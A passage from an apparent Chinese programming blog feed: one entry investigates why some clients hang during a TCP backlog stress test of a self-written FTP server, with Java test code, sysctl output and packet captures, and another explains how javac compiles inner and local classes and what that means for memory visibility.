class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketTimeoutException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.LongAdder;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBacklogClient</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LongAdder adder = <span class="keyword">new</span> LongAdder();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        Vector&lt;Integer&gt; timeoutPorts = <span class="keyword">new</span> Vector&lt;&gt;(<span class="number">1240</span>);</span><br><span class="line">        ExecutorService pool = Executors.newFixedThreadPool(<span class="number">128</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10240</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> finalI = i;</span><br><span class="line">            pool.execute(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Socket socket = <span class="keyword">new</span> Socket(<span class="string">"localhost"</span>, <span class="number">8083</span>);</span><br><span class="line">                    socket.setSoTimeout(<span class="number">1024</span> * <span class="number">10</span>);</span><br><span class="line">                    System.out.println(<span class="string">"connect Success one: "</span> + finalI);</span><br><span class="line">                    String r = readLine(socket.getInputStream());</span><br><span class="line">                    <span class="keyword">assert</span> r == <span class="keyword">null</span> || <span class="string">"hello\r\n"</span>.equals(r);</span><br><span class="line">                    <span class="keyword">if</span> (r == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        timeoutPorts.add(socket.getLocalPort());</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">"read success one: "</span> + finalI);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        pool.shutdown();</span><br><span class="line">        pool.awaitTermination(<span class="number">1024</span>, TimeUnit.DAYS);</span><br><span class="line">        System.out.println(adder.sum());</span><br><span class="line">        System.out.println(timeoutPorts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">readLine</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> t = in.read(buf);</span><br><span class="line">                <span class="keyword">if</span> (t &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                builder.append(<span class="keyword">new</span> String(buf, <span class="number">0</span>, t));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> builder.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SocketTimeoutException ex) &#123;</span><br><span class="line">            adder.add(<span class="number">1</span>);</span><br><span class="line">            System.out.println(<span class="string">"time out, read: "</span> + builder.length()</span><br><span class="line">                    + <span class="string">", "</span> + builder.toString()</span><br><span class="line">                    + <span class="string">", hasCRLF: "</span> + (builder.lastIndexOf(<span class="string">"\r\n"</span>) &gt;= <span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>localhost的系统配置信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ uname -r</span><br><span class="line">4.18.0-13-generic</span><br><span class="line"></span><br><span class="line">$ /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog</span><br><span class="line">512</span><br><span class="line"></span><br><span class="line">$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 18.10</span><br><span class="line">Release:18.10</span><br><span class="line">Codename:cosmic</span><br><span class="line"></span><br><span class="line">$ java -version                  </span><br><span class="line">openjdk version &quot;11.0.1&quot; 2018-10-16</span><br><span class="line">OpenJDK Runtime Environment 18.9 (build 11.0.1+13)</span><br><span class="line">OpenJDK 64-Bit Server VM 18.9 (build 11.0.1+13, mixed mode)</span><br><span class="line"></span><br><span class="line">$ /bin/cat /proc/sys/net/core/somaxconn    </span><br><span class="line">128</span><br></pre></td></tr></table></figure></li><li><p>vps的配置信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~# ./jdk-11.0.2/bin/java -version</span><br><span class="line">java version &quot;11.0.2&quot; 2019-01-15 LTS</span><br><span class="line">Java(TM) SE Runtime Environment 18.9 (build 11.0.2+9-LTS)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.2+9-LTS, mixed mode)</span><br><span class="line"></span><br><span class="line">root@vultr:~# uname -r</span><br><span class="line">4.18.0-10-generic</span><br><span class="line"></span><br><span class="line">root@vultr:~# lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.10</span><br><span class="line">Release:        18.10</span><br><span class="line">Codename:       cosmic</span><br><span class="line"></span><br><span class="line">root@vultr:~# /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog</span><br><span class="line">128</span><br><span class="line"></span><br><span class="line">root@vultr:~# /bin/cat /proc/sys/net/core/somaxconn</span><br><span class="line">128</span><br></pre></td></tr></table></figure></li><li><p>复现过程出现过这个现象：client端<code>ctrl-c</code>关掉后，server端突然就接收到了剩下的所有链接。这个在server运行在localhost时并且 一旦所有其他没有被hang住的链接完成后马上就<code>ctrl-c</code>时出现过，但是在server运行在vps上没出现过。</p></li></ul><h3 id="猜测原因一"><a href="#猜测原因一" class="headerlink" title="猜测原因一"></a>猜测原因一</h3><ul><li><p>按照TCP/IP详解卷二的说法，如果listen的那个端点的队列满了（已经完成三次握手的队列，其大小由backlog确定），那么就不回复syn。但是，有个问题，如果多个syn同时到达，那么即使这时候队列未满，也可能接受了这些syn的一部分后队列就满了，那么linux系统如何处理——是否会存在有些链接三次握手完成，但是放不进队列里。</p></li><li><p>按照这篇文章(<a href="http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html" target="_blank" rel="noopener">http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html</a>)的说法，如果遇到这种情况，服务器会不断发送<code>syn/ack</code>报文（如果<code>/proc/sys/net/ipv4/tcp_abort_on_overflow</code>是<code>1</code>，则发送RST）</p></li><li><p>我自己也抓到了这种报文，其中8083是server，server的backlog只有10，然后有10240个client企图链接该server。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line"> 117974 271.659812650  127.0.0.1             127.0.0.1             TCP      74     [TCP Port numbers reused] 40970 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=0 WS=128</span><br><span class="line"> 117976 271.659818367  127.0.0.1             127.0.0.1             TCP      74     8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=298647084 WS=128</span><br><span class="line"> 117977 271.659825016  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298647084 TSecr=298647084</span><br><span class="line"> 201482 272.673178662  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=298647084 WS=128</span><br><span class="line"> 201563 272.673220860  127.0.0.1             127.0.0.1             TCP      66     [TCP Dup ACK 117977#1] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298647084</span><br><span class="line"> 201993 274.693205982  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298650117 TSecr=298648097 WS=128</span><br><span class="line"> 201995 274.693247830  127.0.0.1             127.0.0.1             TCP      66     [TCP Dup ACK 117977#2] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298650117 TSecr=298647084</span><br><span class="line"> 201997 274.693527487  127.0.0.1             127.0.0.1             TCP      73     8083 → 40970 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=298650117 TSecr=298650117</span><br><span class="line">0000  68 65 6c 6c 6f 0d 0a                              hello..</span><br><span class="line"> 201999 274.693556287  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=298650117 TSecr=298650117</span><br><span class="line"> 202001 274.695599421  127.0.0.1             127.0.0.1             TCP      66     8083 → 40970 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=298650119 TSecr=298650117</span><br><span class="line"> 202009 274.737168658  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298650161 TSecr=298650119</span><br><span class="line"> 203731 297.151676910  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [FIN, ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298672575 TSecr=298650119</span><br><span class="line"> 203732 297.151682855  127.0.0.1             127.0.0.1             TCP      66     8083 → 40970 [ACK] Seq=9 Ack=2 Win=43776 Len=0 TSval=298672575 TSecr=298672575</span><br></pre></td></tr></table></figure><p> 在<code>/proc/sys/net/ipv4/tcp_abort_on_overflow</code>设为<code>1</code>之后，抓到了如下报文。需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line">   5904 9.174057671    127.0.0.1             127.0.0.1             TCP      74     54448 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300065429 TSecr=0 WS=128</span><br><span class="line">  92075 10.190560916   127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300066446 TSecr=0 WS=128</span><br><span class="line">  92209 12.206628025   127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=0 WS=128</span><br><span class="line">  92258 12.206814283   127.0.0.1             127.0.0.1             TCP      74     8083 → 54448 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=300068462 WS=128</span><br><span class="line">  92319 12.207072233   127.0.0.1             127.0.0.1             TCP      66     54448 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=300068462 TSecr=300068462</span><br><span class="line">  92345 12.207466000   127.0.0.1             127.0.0.1             TCP      54     8083 → 54448 [RST] Seq=1 Win=0 Len=0</span><br></pre></td></tr></table></figure><p> 需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文——如下面所示，最后的那个No.为<code>92345</code>后面还有很多报文，都是8083端口的server与client的通信</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line">  92345 12.207466000   127.0.0.1             127.0.0.1             TCP      54     8083 → 54448 [RST] Seq=1 Win=0 Len=0</span><br><span class="line">  92346 12.207985091   127.0.0.1             127.0.0.1             TCP      73     8083 → 54168 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462</span><br><span class="line">  92347 12.208004676   127.0.0.1             127.0.0.1             TCP      66     54168 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=300068463 TSecr=300068463</span><br><span class="line">  92348 12.208041224   127.0.0.1             127.0.0.1             TCP      66     8083 → 54168 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=300068463 TSecr=300068463</span><br><span class="line">  92349 12.208052138   127.0.0.1             127.0.0.1             TCP      73     8083 → 54172 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462</span><br></pre></td></tr></table></figure></li><li><p>然而，这个并不是上述问题的原因，因为打印出来的hang住的端口号，跟发生重传<code>syn/ack</code>的端口号对不上</p></li></ul><h3 id="猜测原因二"><a href="#猜测原因二" class="headerlink" title="猜测原因二"></a>猜测原因二</h3><ul><li>网上搜到这篇文章<a href="http://www.10tiao.com/html/749/201411/201005717/1.html" target="_blank" rel="noopener">http://www.10tiao.com/html/749/201411/201005717/1.html</a></li><li>案例分析（二）那里描述的现象刚好跟跟上述问题非常相似——也是client握手成功但是读不到信息，作者分析的原因是，第三次握手的ACK因为AcceptQueue溢出而被丢弃，导致client进入了ESTABLISHED状态，但是server只是在<code>SYN_RECV</code>状态，并且因为<code>net.ipv4.tcp_synack_retries=1</code>(我的测试机器的这个参数是5)，所以如果Server重传的SYN+ACK报文对应的ACK还是被丢弃，那么就会进入client以为连接成功，但是server并没有连接成功的状态</li><li>然而，我把server架设到另一个机子上，然后使用<code>watch -n 0.5 &quot;netcat -n | grep 8083 | grep -i &quot;syn&quot;&quot;</code>检查server那里是否有链接是一直处于<code>syn_recv</code>状态，但是整个过程中看到的处于<code>SYN_RECV</code>状态的链接端口号都是在不断变动（说明它们不是hang住的链接），并且client端所有没有hang住的链接都完成后，只剩下hang住的链接时，server端是看不到处于<code>syn_recv</code>状态的链接的</li><li>所以我认为可能也不是这个原因（欢迎指正！）</li></ul><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><ul><li>这个问题并没有解决，如果有大佬知道原因，或者有一些想法，欢迎与我交流，谢谢！</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;最近重构一个以前写的FTP Server，压测时，服务器的backlog是20，然后client总是有一些链接，已经&lt;code&gt;
      
    
    </summary>
    
      <category term="网络编程" scheme="https://h-zex.github.io/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="高并发" scheme="https://h-zex.github.io/tags/%E9%AB%98%E5%B9%B6%E5%8F%91/"/>
    
      <category term="backlog" scheme="https://h-zex.github.io/tags/backlog/"/>
    
      <category term="TCP" scheme="https://h-zex.github.io/tags/TCP/"/>
    
  </entry>
  
  <entry>
    <title>Java内部类、局部类的实现原理以及与内存可见性的关系</title>
    <link href="https://h-zex.github.io/2019/03/04/java%E5%86%85%E9%83%A8%E7%B1%BB%E3%80%81%E5%B1%80%E9%83%A8%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
    <id>https://h-zex.github.io/2019/03/04/java内部类、局部类的实现原理/</id>
    <published>2019-03-04T12:54:01.000Z</published>
    <updated>2019-03-04T14:34:45.282Z</updated>
    
    <content type="html"><![CDATA[<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><blockquote><p>以下内容一部分来自于core java第十版，一部分来自于我使用openjdk java1.8/java11的javac和fernflower这个反编译器反编译字节码得到的<br>以下内容不确实是openjdk javac特有的实现，还是规范这样要求</p></blockquote><ul><li><p>对象内总有一个隐式引用， 它指向了创建它的外部类对象，比如下面的反编译代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">JavaLangTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">      JavaLangTest.InnerClass var1 = <span class="keyword">new</span> JavaLangTest.InnerClass(<span class="keyword">new</span> JavaLangTest());</span><br><span class="line">      System.out.println(var1);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JavaLangTest</span>$<span class="title">InnerClass</span> </span>&#123;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> JavaLangTest <span class="keyword">this</span>$<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> JavaLangTest$InnerClass(JavaLangTest var1) &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span> = var1;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 其对应与以下代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        InnerClass innerClass = <span class="keyword">new</span> JavaLangTest().new InnerClass();</span><br><span class="line">        System.out.println(innerClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">InnerClass</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>内部类是一种编译器现象，与虚拟机无关。编译器将会把内部类翻译成用$(美元符号）分隔外部类名与内部类名的常规类文件，而虚拟机则对此一无所知</p></li><li><p>内部类可以访问外围类的私有数据——无论是否static。这是一个编译器现象，那么也就是实际上这个内部类并没有魔法加持，那么它是如何访问外部类的private数据的？外部类会合成一个类似于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> access$<span class="number">100</span>(JavaLangTest x0) &#123;</span><br><span class="line">    <span class="keyword">return</span> x0.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>的方法，然后内部类调用这个方法，传递<code>this$0</code>这种指向外部类的引用的参数，从而获得private的数据（如果是static内部类，那么并不需要传递参数就可以获取）。可以利用这个特性，在无关的地方，使用反射来调用这个方法从而获取该类的private数据</p></li><li><p>局部类的实现原理 </p><ul><li>这是反编译字节码得到的局部类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JavaLangTest</span>$1<span class="title">LocalClass</span> </span>&#123;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> InnerClass val$innerClass;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> <span class="keyword">int</span> val$a;</span><br><span class="line"></span><br><span class="line">   JavaLangTest$<span class="number">1L</span>ocalClass(InnerClass var1, <span class="keyword">int</span> var2) &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">this</span>.val$innerClass = var1;</span><br><span class="line">      <span class="keyword">this</span>.val$a = var2;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">worker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="keyword">this</span>.val$innerClass);</span><br><span class="line">      System.out.println(<span class="keyword">this</span>.val$a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li>这是原来的代码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">InnerClass innerClass = <span class="keyword">new</span> JavaLangTest().new InnerClass();</span><br><span class="line">innerClass.worker();</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">worker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(innerClass);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">LocalClass localClass = <span class="keyword">new</span> LocalClass();</span><br><span class="line">localClass.worker();</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="内存可见性"><a href="#内存可见性" class="headerlink" title="内存可见性"></a>内存可见性</h3><h5 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h5><ul><li>既然我们已经知道内部类访问外部类的原理，那么内存可见性其实就和普通的类之间互相访问对方的数据没有差别。所以，如果一个变量没有final修饰或者没有volatile修饰或者没有加锁，那么就不能保证其对内部类是可见的，即使可见，也不能保证内部来看到的对象是完成构造之后的对象(这里有个问题，原子变量也是吗)</li><li>按照JCIP(java concurrent in practice)，一个对象的引用即使对于某个线程是可见的（比如某个对象发现这个引用非null了），这个对象的状态有可能还没初始化完成，也就是这个对象可能处于不一致状态</li><li>不过我在测试中，因为不能对该对象设置volatile，也不能搞个volatile的flag来标志这个对象是否已经完成初始化(因为JSR133保证，某个volatile变量被Thread a 写入后，Thread b去读这个变量，读了之后，原先在Thread a写入该变量之前对于Thread a可见的状态，对于Thread b都可见)，所以情况一直是读到该变量是null，即使另一个线程已经初始完成。所以没有复现出JCIP中提到的这种情况</li></ul><h5 id="局部类"><a href="#局部类" class="headerlink" title="局部类"></a>局部类</h5><ul><li>因为创建线程过程中，是先构造一个Runnable对象，然后在传递给Thread，也就是构造对象的过程是在原来线程中进行的，所以可以读到这个事实final变量的正确的值</li><li><p>这是手写的代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这是反编译得到的代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> misc.Test3.1;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span 